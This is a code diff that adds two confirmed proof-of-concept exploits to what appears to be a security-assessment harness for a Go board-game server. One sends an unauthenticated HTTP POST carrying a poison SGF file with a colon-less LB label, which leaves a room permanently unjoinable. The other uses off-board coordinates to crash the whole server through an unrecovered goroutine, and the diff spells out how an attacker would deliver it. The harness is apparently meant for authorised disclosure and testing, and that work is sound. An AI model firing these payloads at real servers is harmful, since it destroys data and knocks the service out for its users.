@@ -31,6 +31,9 @@ import (
 	stdzip "archive/zip"
 
 	izip "github.com/golab/board/internal/zip"
+	"github.com/golab/board/pkg/core/board"
+	"github.com/golab/board/pkg/core/color"
+	"github.com/golab/board/pkg/core/coord"
 	"github.com/golab/board/pkg/core/parser"
 	"github.com/golab/board/pkg/state"
 	"golang.org/x/net/websocket"
@@ -529,6 +532,88 @@ func pocH7() {
 }
 
 // =========================================================================
+// SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
+// =========================================================================
+
+// P2-B1: colon-less LB label = persistent poison-pill (unrecoverable board).
+// CONFIRMED: FromSGF accepts LB[z] (no colon) and UploadSGF commits the state
+// BEFORE frame generation; GenerateFullFrame then panics at frame.go:131
+// (text := spl[1]). The poison is persisted (ToSGFIX writes LB[z] back and
+// Hub.Save stores it), so on every reload the room loads clean then panics on
+// the first join -> the board is permanently unjoinable (bricked). The per-join
+// panic is in the request goroutine (recovered -> server survives), but the
+// ROOM is unrecoverable; if the room has the OGS plugin active it escalates to a
+// whole-server crash (generateMarks runs in the OGS goroutine).
+func pocB1() {
+	banner("b1", "Colon-less LB label = persistent poison-pill (unrecoverable board)")
+	sgf := "(;GM[1]FF[4]SZ[19]LB[z])" // LB value has NO colon
+	b64 := base64.StdEncoding.EncodeToString([]byte(sgf))
+	fmt.Printf("poison SGF: %s\n", sgf)
+	fmt.Printf("unauthenticated e2e: POST /api/v1/room/{id}  {\"event\":\"upload_sgf\",\"value\":%q}\n", b64)
+	if target != "" {
+		body := event("upload_sgf", fmt.Sprintf("%q", b64))
+		resp, err := http.Post("http://"+target+"/api/v1/room/poc-b1", "application/json", strings.NewReader(body))
+		if err == nil {
+			_ = resp.Body.Close()
+			fmt.Printf("upload response: %s (state now committed+poisoned)\n", resp.Status)
+			fmt.Println(">> now try to open ws /socket/b/poc-b1 — the join panics on GenerateFullFrame;")
+			fmt.Println(">> the room is bricked and, once persisted, stays bricked across restarts.")
+		}
+	}
+	// local proof of the exact panic:
+	s, err := state.FromSGF(sgf)
+	if err != nil {
+		fmt.Println("FromSGF err (unexpected):", err)
+		return
+	}
+	fmt.Println("FromSGF OK — poisoned state committed")
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				fmt.Printf(">> GenerateFullFrame PANIC: %v\n", r)
+				fmt.Println(">> every join re-triggers this; persisted -> board permanently unjoinable.")
+			}
+		}()
+		_ = s.GenerateFullFrame(state.Full)
+		fmt.Println("no panic (unexpected)")
+	}()
+}
+
+// P2-A1: Board.Set nil/out-of-bounds -> whole-server crash via the OGS review
+// plugin goroutine. CONFIRMED: Board.Set (board.go:127) has no nil/bounds guard,
+// and Legal() calls the guarded Get() first (returns Empty for off-board, so the
+// move is NOT rejected) then the unguarded Set(). An OGS review whose moves are
+// off-board/pass feed Board.Move from inside `go o.loop()` (ogs.go:198) — a
+// spawned goroutine net/http does NOT recover -> whole process aborts.
+// Delivery e2e needs an attacker-authored online-go.com review + request_sgf;
+// this local call proves the fatal panic the goroutine would suffer.
+func pocA1() {
+	banner("a1", "Board.Set nil/OOB -> whole-server crash via OGS review goroutine (not recovered)")
+	fmt.Println("e2e (unauth): create an online-go.com review with an off-board/pass move, then send")
+	fmt.Println("  {\"event\":\"request_sgf\",\"value\":\"https://online-go.com/review/<id>\"} to a password-less room.")
+	fmt.Println("  The move is parsed and played in `go o.loop()` (ogs.go:198) — a goroutine outside net/http's recover.")
+	for _, tc := range []struct {
+		name string
+		c    *coord.Coord
+	}{
+		{"off-board (1000,1000)", coord.NewCoord(1000, 1000)},
+		{"negative (-1,-1)", coord.NewCoord(-1, -1)},
+	} {
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					fmt.Printf(">> [%s] PANIC in Board.Move: %v\n", tc.name, r)
+				}
+			}()
+			b := board.NewBoard(19)
+			b.Move(tc.c, color.Black) // Legal -> Get (guarded, passes) -> Set (UNGUARDED) -> panic
+			fmt.Printf("[%s] no panic (unexpected)\n", tc.name)
+		}()
+	}
+	fmt.Println(">> In the OGS goroutine this panic is UNRECOVERED -> the whole server crashes.")
+}
+
+// =========================================================================
 
 func roomCount() int { return statField("rooms") }
 func connCount() int { return statField("connections") }
@@ -575,6 +660,8 @@ var pocs = []struct {
 	{"h5", "Twitch HMAC bypass on empty secret (CONFIRMED)", pocH5},
 	{"h6", "NGF/SGF board size — MITIGATED, not exploitable (see C-3)", pocH6},
 	{"h7", "Tree toSGF stack overflow (CONFIRMED whole-server crash, elevated to Critical)", pocH7},
+	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
+	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
 }
 
 func usage() {
@@ -584,8 +671,9 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7  (h6 verifies a mitigation)")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1  (h6 verifies a mitigation)")
 	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5")
+	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
 }
 
